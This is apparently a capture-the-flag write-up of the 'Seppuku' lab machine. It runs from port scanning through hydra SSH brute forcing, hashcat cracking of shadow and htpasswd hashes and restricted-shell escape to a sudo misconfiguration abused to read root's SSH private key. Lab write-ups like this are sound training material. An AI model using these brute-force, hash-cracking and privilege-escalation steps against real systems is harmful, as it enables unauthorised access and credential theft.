# Seppuku

`netdiscover` found the box running on this IP

```
192.168.1.181
```

## Port scan
```
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 64 vsftpd 3.0.3
22/tcp   open  ssh         syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd:55:a8:e4:0f:28:bc:b2:a6:7d:41:76:bb:9f:71:f4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhKnaNVJ/YnScPD1GDZSIfyC/a4jjHhSnoEgi2c/c03kE4JVZbA4cTFeEHGq4PFTyiuchv9w9zNu8XtVIDhILb9K4D38EssujmpekrrAnYkS0yU8Kqas1+3FCY8xjz6a5yVdMk/aQVa4BfFXWnv+rdlio0ZFVdLDaRaG90KMUEVw18Ogzt9lBbnbf7gOR0EGPKW0xzyDyI70u5FJnarDFV9jCZL/flcCL0m+MAycgdFyFqCOTjNxd8Qn2R3rnhgjSER5C9c+qEI/htLmtnXTC0p6AMeTDjO3J57LEB1WFYJ4wkeuEUtPadfhwgDR16XqWmqw2HcBIj1W9H9V47KFfR
|   256 16:fa:29:e4:e0:8a:2e:7d:37:d2:6f:42:b2:dc:e9:22 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC+yj9GRgyn2boC7Dw9un6PEwviM8NZ1CRTjmrHRFiOT+0co+OOwxD5RRQCxuS22zJgsiDIEka8ypTjYWlnJ9T8=
|   256 bb:74:e8:97:fa:30:8d:da:f9:5c:99:f0:d9:24:8a:d5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIESejQ038eElmlRfbqAgaRSK120jvrz9WQ5UcjxJdJ71
80/tcp   open  http        syn-ack ttl 64 nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: 401 Authorization Required
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Content
139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
8088/tcp open  http        syn-ack ttl 64 LiteSpeed httpd
|_http-server-header: LiteSpeed
|_http-title: Seppuku
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
MAC Address: 00:0C:29:B1:65:81 (VMware)

```

## Enumeration
We weren't able to anonymous login with ftp

Port 80 requires authentication, we tried a few basic combinations such as
	- admin:admin
	- admin:password
	- root:root
	- root:password

![[Pasted image 20220708141325.png]]

Anonymous login wasn't allowed on the Samba Share

Port 8088 didn't have anything interesting



we found some interesting files

![[Pasted image 20220708140408.png]]

We were able to crack the `shadow.bak` file pretty quickly with hashcat and the supplied wordlist. However, the username is `rabbit-hole` and these credentials don't appear to work anywhere.

![[Pasted image 20220708140704.png]]

We also tried using some RSA tokens that we found in `/keys/`

![[Pasted image 20220708140815.png]]

This also led nowhere.

Next I threw the password list at ssh using the hostname of the box as the user (this has been a common pattern in the past).
```
hydra -l 'seppuku' -P ../loot/password.lst 192.168.1.181 ssh
```

This gives us a way in

![[Pasted image 20220708140232.png]]

```
seppuku
```

```
eeyoree
```

## Privesc

We start with some manual enumeration, and notice the user is able to run `/usr/bin/ln -sf /root/ /tmp/` as root with no password.

![[Pasted image 20220708144040.png]]

Running the command copies the whole /root/ directory into /tmp so we can view the files.

```
sudo /usr/bin/ln -sf /root/ /tmp/
```

we then try to move to the folder to see the files

```
cd /tmp
```

we see we're in a restricted rbash session

![[Pasted image 20220708144617.png]]

we can easily escape this with

```
bash -i
```

but we don't have permissions to view the /tmp/root directory

### Linpeas
at this point we decided to turn to linpeas, here are some of the findings

#### sudo version 1.8.27

![[Pasted image 20220708150043.png]]

#### nginx htpasswd
![[Pasted image 20220708145743.png]]

```
admin:$apr1$sHVvV4Vi$FFQ2lYSWSsNM/gDRPXPgr1
```

Hashcat and crackstation didn't automatically recognize this hash type, though we were able to see it's similar to `Apache` which is **mode 1600** on the [example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes)

we also needed to modify the hash file so it only contained the hash and NOT the username:

```
$apr1$sHVvV4Vi$FFQ2lYSWSsNM/gDRPXPgr1
```

```
hashcat -m 1600 hash password.lst
```

![[Pasted image 20220708151750.png]]

**credentials**

```
admin
```

```
Football
```

#### id_rsa.pub
![[Pasted image 20220708145809.png]]

```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKkmXCMpd/QXhi8vaB/C+hS68Ht+4Ywx8J7jWAsKxOyV45TLYIlf6g3BVUo+mXpNgjidc8ZuLB8bOjGbQVlrsP3K
vzc6DC68wynzc6RVzAv2/7Htq0rwABVnQ2O848aS8SEHas9LaYqDXFEpcIzukDQpI6gNuT1yg6lp2ODgbR/Vg9avCnqIt8gSt9jb7mFLtDJNCm5GYe5Hh4osXU0VGn
yBi40JW2vSfZS7qFa4jtFYEZBkkmiPwsqN9FFiYoanKqIZN1HL7zILIC5PnmyG4LNe5z7/ccTaMAI4Pz6lI8qPDHObh+5pJ8FNSQd/KGJIoiSinZh8gMspE8zx0afn
O5
```

This gives an idea to try to `private` key we found earlier for this user. It works!

#### lateral movement to user: tanto

```bash
ssh -i private tanto@192.168.1.181
```

This user was also in a restricted shell, we need to escape with

```
bash -i
```

after some manual enumeration and running linpeas, it doesn't appear that we have any new permissions as this user

#### users with console

![[Pasted image 20220708145828.png]]

#### interesting files in home directory

![[Pasted image 20220708145845.png]]

![[Pasted image 20220708150305.png]]

```
12345685213456!@!@A
```

Turns out, this is a clear-text backup of a password for the user `samurai`

```
su samurai
```

paste the password

samurai is allowed to run the following with elevated privileges

```
/../../../../../../home/tanto/.cgi_bin/bin /tmp/*
```

![[Pasted image 20220708154846.png]]

after reviewing linpeas results, it appears the only access gained was the above sudo command.

I tried running the command, but the path `/home/tanto/.gci_bin/bin` does not exist. Since we have access as tanto through an ssh-key, we log in and create a copy of `ls` at that path

```
ssh -i private tanto@192.168.1.181
```

break out of rbash

```
bash -i
```

copy the `ls` binary

```
mkdir /home/tanto/.cgi_bin/ && cp /usr/bin/ls $HOME/.cgi_bin/bin
```

then, in a different shell running as `samurai`, run the binary with sudo and `ls` the `/tmp/root` directory

```
sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/root
```

we see `root.txt`, but lets try to get a session as root. I wonder if there are any ssh keys.

```
sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/root/.ssh
```

![[Pasted image 20220708160529.png]]

now, we can view the key by replacing our sudo binary with the `cat` command, again running in a session as the `tanto` user

```
mkdir /home/tanto/.cgi_bin/ && cp /usr/bin/cat $HOME/.cgi_bin/bin
```

```
sudo /../../../../../../home/tanto/.cgi_bin/bin /tmp/root/.ssh/id_rsa > root_rsa
```

we then copy the file over to our kali box.

the rsa key worked! We're able to log in as root now using ssh.

```
ssh -i root_rsa root@192.168.1.181
```

![[Pasted image 20220708161418.png]]

# Root flag
```
{SunCSR_Seppuku_2020_X}
```